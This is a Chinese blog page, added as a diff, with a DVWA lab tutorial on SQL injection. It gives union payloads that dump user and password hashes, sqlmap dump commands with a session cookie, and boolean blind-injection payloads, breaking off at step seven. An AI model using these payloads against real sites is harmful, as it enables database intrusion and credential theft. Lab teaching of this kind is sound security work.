@@ -1,0 +1,418 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>SQL注入 | Hello World 🐳</title><meta name="author" content="半岛铁盒"><meta name="copyright" content="半岛铁盒"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="SQL注入攻击实战SQL注入概述　　所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。它是利用现有应用程序，将（恶意的）SQL 命令注入到后台数据库引擎执行的能力，它可以通过在 Web 表单中输入（恶意）SQL 语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行 SQL 语句。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入">
+<meta property="og:url" content="http://www.zsss.cf/2022/10/19/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/index.html">
+<meta property="og:site_name" content="Hello World 🐳">
+<meta property="og:description" content="SQL注入攻击实战SQL注入概述　　所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。它是利用现有应用程序，将（恶意的）SQL 命令注入到后台数据库引擎执行的能力，它可以通过在 Web 表单中输入（恶意）SQL 语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行 SQL 语句。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.zsss.cf/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/01.jpg">
+<meta property="article:published_time" content="2022-10-19T02:59:22.000Z">
+<meta property="article:modified_time" content="2022-11-24T08:36:21.945Z">
+<meta property="article:author" content="半岛铁盒">
+<meta property="article:tag" content="网络安全技术">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.zsss.cf/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/01.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://www.zsss.cf/2022/10/19/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?089ae243d838c5dea0f45ce8c4cae9ca";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: 半岛铁盒","link":"链接: ","source":"来源: Hello World 🐳","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQL注入',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2022-11-24 16:36:21'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"/>
+<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
+  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
+<link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">118</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa-fw fa fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 图库</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/01.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Hello World 🐳</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa-fw fa fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 图库</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-19T02:59:22.000Z" title="发表于 2022-10-19 10:59:22">2022-10-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-24T08:36:21.945Z" title="更新于 2022-11-24 16:36:21">2022-11-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%95%99%E7%A8%8B/">教程</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQL注入"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"></p>
+
+<h1 id="SQL注入攻击实战"><a href="#SQL注入攻击实战" class="headerlink" title="SQL注入攻击实战"></a>SQL注入攻击实战</h1><h2 id="SQL注入概述"><a href="#SQL注入概述" class="headerlink" title="SQL注入概述"></a>SQL注入概述</h2><p>　　<font face="隶书">所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。它是利用现有应用程序，将（恶意的）SQL 命令注入到后台数据库引擎执行的能力，它可以通过在 Web 表单中输入（恶意）SQL 语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行 SQL 语句。</font></p>
+<p>　<font face="隶书">　SQL 注入一般按照注入方式可以分为普通注入和盲注。普通注入就是注入的页面是直接显示数据库中的字段内容的，我们可以通过 SQL 注入一步一步把数据库中我们想要的内容显示在页面中。而盲注则要困难很多，页面并没有直接显示数据库字段内容，显示的可能只是一个判断结果（是或者否），页面只能告诉你你构造的 SQL 语句对还是错，你要查询的内容存在还是不存在。这种情况下，我们只能全部靠猜。更有甚者，连是否的结果都不显示，我们可能还需要通过返回数据的延迟来判断是否猜对。</font></p>
+<p>　<font face="隶书">　SQL 注入按照注入的数据类型还可以分为数字型注入和字符型注入。SQL 注入一般都需要利用 Web 站点现有的查询语句。当现有的查询语句 Where 筛选条件匹配的字段是数值类型，那么就是数字型注入；如果匹配的字段是字符类型，那么就是字符型注入。一般字符型注入需要构造单引号用于闭合语法，还需要加入注释符使原本的单引号无效。另外，SQL 注入按照提交参数方式，还可以分为 GET 方式注入、POST 方式注入等等。</font></p>
+<h2 id="Low级别SQL注入实战"><a href="#Low级别SQL注入实战" class="headerlink" title="Low级别SQL注入实战"></a>Low级别SQL注入实战</h2><hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">常用函数：</span><br><span class="line">group_concat(str) 将获取到的内容合并成一行输出</span><br><span class="line">concat_ws(str1,str2…) 合并输出查询的字段</span><br><span class="line">table_name 具体的数据表</span><br><span class="line">column_name 字段名</span><br><span class="line">information_schema 自5.7及后的MySQL版本，都有了这个库，所有的表都会记录在这个数据库下</span><br><span class="line">information_schema.tables 所有的数据表</span><br><span class="line">information_schema.columns 所有的数据表中的字段</span><br><span class="line">table_schema 数据库的名称</span><br><span class="line">where 筛选指定内容</span><br><span class="line">order by 判断有多少字段</span><br><span class="line">database() 查看当前使用什么数据库</span><br><span class="line">version() 查看当前使用什么版本的MySQL</span><br><span class="line">@@datadir 查看当前MySQL的路径</span><br><span class="line">@@version_compile_os 查看操作系统版本</span><br><span class="line">limit 查询其它数据库或者表,列等名称</span><br><span class="line">user() 查询当前用户权限</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h3><p><strong>I</strong>.<em>设置安全级别为Low后，点击</em><code>SQL Injection</code><em>进入SQL注入练习页面。首先在文本框随便输入一个ID号，发现可以返回用户信息。同时发现URL中出现了提交的参数信息，说明该页面提交方式为</em><code>GET</code>，<em>如</em><code>图1-1</code></p>
+<p><font face="隶书">GET从服务器上获取数据;POST是向服务器传送数据</font><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/01.jpg"><em>图1-1</em></p>
+<p><strong>II</strong>.<em>在文本框输入</em><code>单引号</code>，<em>发现错误，判断存在SQL漏洞，并从报错信息中得知该站点的数据库为 MySQL</em>如<code>图1-2</code><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/02.jpg" alt="image-20221031220308148"><em>图1-2</em></p>
+<p><strong>III</strong>.<em>在文本框输入</em><code>1 and 1=1</code><em>和</em><code>1 and 1=2</code>，<em>都能返回数据，说明可能注入漏洞是字符型，如</em><code>图1-3</code></p>
+<p><font face="隶书">数字型和字符型区别在于是否闭合，<strong>字符型注入需要闭合</strong>，<strong>数字型注入不需要闭合</strong></font><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/03.jpg"><em>图1-3</em></p>
+<p><strong>IV</strong>.<em>寻找注入点，在文本框输入</em><code>1&#39; and 1=1#</code>，<em>可以返回数据</em>，<em>输入</em><code>1&#39; and 1=2#</code>，<em>没有数据返回，说明漏洞为字符型，如</em><code>图1-4</code>。<img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/04.jpg"><em>图1-4</em></p>
+<p><strong>V</strong>.<em>在文本框输入</em> <code>1&#39; order by 1#</code> <em>和</em> <code>1&#39; order by 2#</code>，<em>有数据返回，输入</em> <code>1&#39; order by 3#</code>，<em>页面报错，<strong>判断字段为2个字段</strong></em>，如<code>图1-5</code><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/05.jpg"><em>图1-5</em></p>
+<p><strong>VI</strong>.<em>找回显点，在文本框输入</em><code>1&#39; and 1=2 union select 1,2#</code>，<em>确认页面中First name处显示的是记录集中第一个字段，Surname处显示的是记录集中第二字段</em>，如<code>图1-6</code><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/06.jpg"><em>图1-6</em></p>
+<p><strong>VII</strong>.<em>在文本框输入</em><code>1&#39; and 1=2 union select database(),2#</code>，<em>原第一个字段处显示当前数据库名称为</em><code>dvwa</code>，如<code>图1-7</code><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/07.jpg"><em>图1-7</em></p>
+<p><strong>VIII</strong>.<em>在文本框输入</em> <code>1&#39; and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</code>，<em>原第二个字段处显示当前数据库中的所有表名。发现 guestbook 表和 users 表，users 表中极有可能是记录用户名和密码的表，如</em><code>图1-8</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注：group_concat 把查询数据放到一列中显示；where 筛选指定内容</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/08.jpg"><em>图1-8</em></p>
+<p><strong>IX</strong>.<em>在文本框输入</em> <code>1&#39; and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;#</code>，<em>原第二个字段处显示 users 表中的所有字段名。其中发现 user 和 password 字段，极有可能是用户名和密码字段，如</em><code>图1-9</code><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/1-9.jpg"><em>图1-9</em></p>
+<p><strong>X</strong>.<em>在文本框输入</em><code>1&#39; and 1=2 union select user,password from users#</code>，原第一个字段和第二个字段处分别显示表中的用户名和密码，如<code>图1-10</code><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/10.jpg"><em>图1-10</em></p>
+<p><strong>XI</strong>.<em>在<code>http://www.cmd5.com/</code>线破解MD5加密密码，即可得到密码明文，如</em><code>图1-11</code><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/11.jpg"><em>图1-11</em></p>
+<h3 id="SQLMap-自动化注入"><a href="#SQLMap-自动化注入" class="headerlink" title="SQLMap 自动化注入"></a>SQLMap 自动化注入</h3><p><strong>I</strong>. <em>在kali中访问DVWA，安全级别设置为<code>Low</code>，进入SQL注入模块，随意输入ID值，并复制当前URL地址</em></p>
+<p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/12.jpg"></p>
+<p><strong>II</strong>.<em>使用SQLMAP对dvwa中的sql injection模块进行注入</em>，<em>获取靶机mysql中有哪些数据库</em>。</p>
+<p><code>┌──(kali㉿kali)-[~]</code><br><code>└─$ sqlmap -u &quot;http://192.168.23.110/DVWA/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=2sr6365av3asq6o21suh8h8sj5&quot; -batch --dbs</code></p>
+<p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/13.jpg"></p>
+<p><strong>II</strong>. <em>获取dvwa数据库有哪些表</em></p>
+<p><code>┌──(kali㉿kali)-[~]</code><br><code>└─$ sqlmap -u &quot;http://192.168.23.110/DVWA/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=2sr6365av3asq6o21suh8h8sj5&quot; –batch -D dvwa –tables</code></p>
+<p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/14.jpg"></p>
+<p><strong>III</strong>.  <em>获取dvwa数据库users表中有哪些字段</em></p>
+<p><code>┌──(kali㉿kali)-[~]</code><br><code>└─$ sqlmap -u &quot;http://192.168.23.110/DVWA/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=2sr6365av3asq6o21suh8h8sj5&quot; –batch -D dvwa –T users  --columns</code></p>
+<p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/15.jpg"></p>
+<p><strong>IV</strong>.  <em>查询users表中user和password两个字段的数据。</em></p>
+<p><code>┌──(kali㉿kali)-[~]</code><br><code>└─$ sqlmap -u &quot;http://192.168.23.110/DVWA/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=2sr6365av3asq6o21suh8h8sj5&quot; –batch -D dvwa –T users  --C &quot;user,password&quot; --dump</code></p>
+<p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/16.jpg"></p>
+<h1 id="SQL-盲注攻击实战"><a href="#SQL-盲注攻击实战" class="headerlink" title="SQL 盲注攻击实战"></a>SQL 盲注攻击实战</h1><h2 id="SQL盲注的分类"><a href="#SQL盲注的分类" class="headerlink" title="SQL盲注的分类"></a>SQL盲注的分类</h2><p>​	<font face="黑体">SQL 注入可以分为普通注入和盲注。当注入的页面无法直接显示数据内容，就只能靠盲注来猜解。盲注又可以具体分为布尔型盲注和延时型盲注。</font></p>
+<p>​	<font face="黑体">布尔型盲注是指注入页面中没有直接显示数据内容，但会显示输出的结果对还是错，查询的数据有还是没有。比如输入的 ID 值查询到有该记录，就在页面上显示该记录存在；如果输入的 ID 值不存在，页面上就显示记录不存在，除此之外没有任何更多的信息，我们通过注入构造的任何 SQL 语句也只能返回存在或者不存在两种结果。通过返回结果的对或错来判断构造的 SQL 语句是否成立，这种盲注方式就是布尔型盲注。 </font></p>
+<p>​	<font face="黑体">对于某些 SQL 注入页面，可能页面中任何信息都不返回，甚至连记录是否存在都不告诉你，这时布尔型盲注也就无效了。但是基于 <code>sleep()</code> 函数可以实现延时查询，我们可以构造一个判断语法，如果返回结果为真，则延时 5 秒再进行查询操作。那么我们就可以通过观察提交 SQL 注入语句后，页面响应是否有延时卡顿，来判断我们构造的 SQL 语句是否成立。这种盲注方式就称为延时型盲注。</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">常用函数：		</span><br><span class="line">length(&#x27;abcd&#x27;)		//获取长度函数</span><br><span class="line">截取字符串：</span><br><span class="line">select mid(&#x27;abcdefghijklm&#x27;,5,5);</span><br><span class="line">select substr(&#x27;abcdefghijklm&#x27;,5,5);</span><br><span class="line">select left(&#x27;abcdefhijklm&#x27;,5);</span><br><span class="line">转换成ascii码：</span><br><span class="line">select ord(&#x27;a&#x27;);</span><br><span class="line">select ascii(&#x27;a&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Low-级别-SQL-盲注攻击实战"><a href="#Low-级别-SQL-盲注攻击实战" class="headerlink" title="Low 级别 SQL 盲注攻击实战"></a>Low 级别 SQL 盲注攻击实战</h2><h3 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h3><p><strong>One</strong>.<em>设置安全级别为 <code>Low</code>，点击 <code>SQL Injection (Blind)</code> 按钮进入 SQL 盲注攻击模块，随便输入 ID 值，发现只返回一个结果 <code>User ID exists in the database</code>，告诉我们该 ID 存在，没有显示关于该 User 的任何信息。说明该页面只能通过盲注来攻击</em>。<img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/50.jpg"></p>
+<p><strong>Two</strong>.<em>文本框中输入</em> <code>1 and 1=1</code> 和 <code>1 and 1=2</code> 都返回结果 <code>exists</code>，<em>说明不是数字型注入点</em>。<img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/51.jpg"></p>
+<p><strong>Three</strong>.<em>在文本框中输入</em> <code>1&#39; and 1=1#</code>，<em>返回结果</em> <code>exists</code>，输入 <code>1&#39; and 1=2#</code>，返回结果 <code>MISSING</code>，<em>说明存在 SQL 注入漏洞，为字符型</em>。<img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/52.jpg"></p>
+<p><strong>Four</strong>.<em>在文本框中输入 <code>1&#39; and length(database())=1#</code>，返回结果 <code>MISSING</code>，说明当前数据库名长度大于 1 个字符</em>。</p>
+<p><font face="隶书">注：length(database()) &#x2F;&#x2F;当前数据库名的长度</font><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/53.jpg"></p>
+<p><strong>Five</strong>.<em>逐个猜测数据库名字长度，直到输入 <code>1&#39; and length(database())=4#</code> 时，返回结果 <code>exists</code>，说明当前数据库名长度为 4 字符</em>。</p>
+<p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/54.jpg"></p>
+<p><strong>Six</strong>.<em>在文本框中输入 <code>1&#39; and ascii(substr(database(),1,1))&gt;97#</code>，返回结果 <code>exists</code>，输入 <code>1&#39; and acsii(substr(database(),1,1))&lt;122#</code>，返回结果 <code>exists</code>，说明数据库名的第一位字符是小写字母。（小写字母 a 的 ASCII 码为 97，小写字母 z 的 ASCII 码为 122）。</em><font face="黑体">过程略</font></p>
+<p><font face="隶书">注：substr(database(),1,1) &#x2F;&#x2F;截取数据库名称，从第一个字符开始截，一共截取1个字符</font><br><font face="隶书">注：ascii()                      &#x2F;&#x2F;取括号中的字符的 ASCII 码</font></p>
+<p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/55.jpg"></p>
+<p><strong>Seven</strong>.</p>
